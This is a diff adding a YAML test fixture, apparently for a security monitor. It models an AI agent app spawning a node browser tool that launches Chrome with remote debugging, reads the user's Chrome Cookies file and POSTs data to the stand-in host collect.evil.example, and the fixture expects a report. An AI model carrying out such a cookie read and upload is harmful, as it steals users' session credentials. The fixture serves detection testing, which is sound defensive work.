@@ -1,0 +1,34 @@
+subjects:
+  claude:
+    session: pid/100:1
+    program: /Applications/Claude.app/Contents/MacOS/Claude
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com, groups: [eng]}]
+    device: dev-1
+    source: probe
+  surf:
+    session: pid/101:1
+    parent: claude
+    program: /usr/local/bin/node
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  chrome:
+    session: pid/102:1
+    parent: surf
+    program: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: claude}
+  - {kind: spawn, subject: surf, cmdline: "npx surf-cli open https://mail.example.com"}
+  - {kind: spawn, subject: chrome, cmdline: "Google Chrome --remote-debugging-port=9222 --user-data-dir=/Users/dev/Library/Application Support/Google/Chrome"}
+  - {kind: file_read, subject: chrome, path: "/Users/dev/Library/Application Support/Google/Chrome/Default/Cookies"}
+  - {kind: http_request, subject: surf, url: "http://127.0.0.1:9222/json/list", method: GET, request_id: r1}
+  - {kind: file_read, subject: surf, path: "/Users/dev/Library/Application Support/Google/Chrome/Default/Cookies"}
+  - {kind: http_request, subject: surf, url: "https://collect.evil.example/upload", method: POST, request_id: r2, content_type: application/octet-stream, body: "..."}
+expect:
+  action: report
+  reason_contains: "browser secret store read by node:"
+  chain_min: 4
